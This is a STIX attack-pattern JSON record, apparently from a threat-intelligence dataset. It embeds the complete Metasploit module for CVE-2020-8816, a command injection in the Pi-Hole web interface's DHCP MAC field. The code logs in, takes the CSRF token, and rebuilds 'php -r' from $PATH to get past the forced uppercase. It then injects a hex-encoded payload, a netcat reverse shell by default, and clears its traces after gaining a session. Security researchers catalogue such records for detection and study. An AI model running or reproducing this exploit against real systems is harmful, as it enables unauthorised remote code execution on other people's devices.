{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f959a1ab-d556-4ba5-8797-af610bac50d6",
    "created": "2024-08-14T17:14:32.871929Z",
    "modified": "2024-08-14T17:14:32.871933Z",
    "name": "Pi-Hole DHCP MAC OS Command Execution",
    "description": " This exploits a command execution in Pi-Hole <= 4.3.2.  A new DHCP static lease is added with a MAC address which includes an RCE.  Exploitation requires /opt/pihole to be first in the $PATH due to exploitation constraints.  DHCP server is not required to be running.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pihole_dhcp_mac_exec.rb",
            "external_id": "pihole_dhcp_mac_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8816"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Pihole\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pi-Hole DHCP MAC OS Command Execution',\n        'Description' => %q{\n          This exploits a command execution in Pi-Hole <= 4.3.2.  A new DHCP static lease is added\n          with a MAC address which includes an RCE.  Exploitation requires /opt/pihole to be first\n          in the $PATH due to exploitation constraints.  DHCP server is not required to be running.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Fran\u00e7ois Renaud-Philippon <nate@nate.red>' # original PoC, discovery\n        ],\n        'References' => [\n          ['URL', 'https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/'],\n          ['CVE', '2020-8816']\n        ],\n        'Platform' => ['unix'],\n        'Privileged' => false,\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2020-03-28',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_netcat'\n        },\n        'Payload' => {\n          'BadChars' => \"\\x00\"\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS],\n          'RelatedModules' => ['exploit/linux/local/pihole_remove_commands_lpe']\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The URI of the Pi-Hole Website', '/'])\n      ]\n    )\n  end\n\n  def check\n    begin\n      _version, web_version, _ftl = get_versions\n\n      if web_version.nil?\n        print_error(\"#{peer} - Could not connect to web service - no response or non-200 HTTP code\")\n        return Exploit::CheckCode::Unknown\n      end\n\n      if web_version && Rex::Version.new(web_version) <= Rex::Version.new('4.3.2')\n        vprint_good(\"Web Interface Version Detected: #{web_version}\")\n        return CheckCode::Appears\n      else\n        vprint_bad(\"Web Interface Version Detected: #{web_version}\")\n        return CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} - Could not connect to the web service\")\n      return Exploit::CheckCode::Unknown\n    end\n    CheckCode::Safe\n  end\n\n  def add_static(payload, token)\n    # we don't use vars_post due to the need to have duplicate fields\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_get' => {\n        'tab' => 'piholedhcp'\n      },\n      'data' => [\n        'AddMAC=',\n        'AddIP=',\n        'AddHostname=',\n        \"AddMAC=#{URI.encode_www_form_component(payload)}\",\n        \"AddIP=192.168.#{rand_text_numeric(1..2).to_i}.#{rand_text_numeric(1..2).to_i}\", # to_i to remove leading 0s\n        \"AddHostname=#{rand_text_alphanumeric(8..12)}\",\n        'addstatic=',\n        'field=DHCP',\n        \"token=#{URI.encode_www_form_component(token)}\"\n      ].join('&')\n    )\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')\n    end\n\n    begin\n      @macs = []\n      # get cookie\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'admin', 'index.php'),\n        'keep_cookies' => true\n      )\n\n      # check login\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'tab' => 'piholedhcp'\n        }\n      )\n\n      # check if we got hit by a login prompt\n      if res && res.body.include?('Sign in to start your session')\n        res = login(datastore['PASSWORD'])\n        fail_with(Msf::Exploit::Failure::BadConfig, 'Incorrect Password') if res.nil?\n      end\n\n      token = get_token('piholedhcp')\n\n      if token.nil?\n        fail_with(Failure::UnexpectedReply, 'Unable to find token')\n      end\n      print_status(\"Using token: #{token}\")\n\n      # from the excellent writeup about the vuln:\n      # The biggest difficulty in exploiting this vulnerability is that the user input is\n      # capitalized through a call to \"strtoupper\". Because of this, no lower case character\n      # can be used in the resulting injection.\n\n      # we'd like to execute something similar to this:\n      # aaaaaaaaaaaa&&php -r 'PAYLOAD'\n      # however, we need to pull p, h, and r from the system due to all input getting capitalized\n      # this is performed by pulling them from the $PATH which should be something like\n      # /opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n      # first payload we send is to check that this is in the path to verify exploitation is possible\n      mac = rand_text_hex(12).upcase\n      @macs << mac\n      vprint_status(\"Validating path with MAC: #{mac}\")\n      res = add_static(\"#{mac}$PATH\", token)\n\n      # ruby regex w/ interpolate and named assignments needs to be in .match instead of =~\n      env = res.body.match(/value=\"#{mac}(?<env>.*)\">/)\n      if env && env[:env].starts_with?('/opt/pihole')\n        print_good(\"System env path exploitable: #{env[:env]}\")\n      else\n        msg = '/opt/pihole not in path. Exploitation not possible.'\n        if env\n          msg += \" Path: #{env[:env]}\"\n        end\n        fail_with(Failure::UnexpectedReply, msg)\n      end\n\n      # once we have php -r, we then need to pass a payload.  So we do this via php command\n      # exec on hex2bin since our payload in hex caps will still get processed and executed.\n\n      mac = rand_text_hex(12).upcase\n      @macs << mac\n      print_status(\"Payload MAC will be: #{mac}\")\n      shellcode = \"#{mac}&&\" # mac address, arbitrary\n      shellcode << 'W=${PATH#/???/}&&'\n      shellcode << 'P=${W%%?????:*}&&'\n      shellcode << 'X=${PATH#/???/??}&&'\n      shellcode << 'H=${X%%???:*}&&'\n      shellcode << 'Z=${PATH#*:/??}&&'\n      shellcode << 'R=${Z%%/*}&&$'\n      shellcode << \"P$H$P$IFS-$R$IFS'EXEC(HEX2BIN(\" # php -r exec(hex2bin(\n      shellcode << '\"'\n      shellcode << payload.encoded.unpack('H*').join('') # hex encode payload\n      shellcode << '\"));'\n      shellcode << \"'&&\"\n\n      vprint_status(\"Shellcode: #{shellcode}\")\n      print_status('Sending Exploit')\n      add_static(shellcode, token)\n\n      # we don't use vars_post due to the need to have duplicate fields\n      ip = '192.168'\n      2.times { ip = \"#{ip}.#{rand_text_numeric(1..2).to_i}\" } # to_i removes leading zeroes\n      send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n        'ctype' => 'application/x-www-form-urlencoded',\n        'keep_cookies' => true,\n        'method' => 'POST',\n        'vars_get' => {\n          'tab' => 'piholedhcp'\n        },\n        'data' => [\n          'AddMAC=',\n          'AddIP=',\n          'AddHostname=',\n          \"AddMAC=#{URI.encode_www_form_component(shellcode)}\",\n          \"AddIP=192.168.#{rand_text_numeric(1..2).to_i}.#{rand_text_numeric(1..2).to_i}\", # to_i to remove leading 0s\n          \"AddHostname=#{rand_text_alphanumeric(3..8)}\",\n          'addstatic=',\n          'field=DHCP',\n          \"token=#{URI.encode_www_form_component(token)}\"\n        ].join('&')\n      )\n\n    # entries are written to /etc/dnsmasq.d/04-pihole-static-dhcp.conf\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  def on_new_session(session)\n    super\n    @macs.each do |mac|\n      print_status(\"Attempting to clean #{mac} from config\")\n      session.shell_command_token(\"sudo pihole -a removestaticdhcp #{mac}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-28",
    "x_mitre_platforms": [
        "['unix']"
    ]
}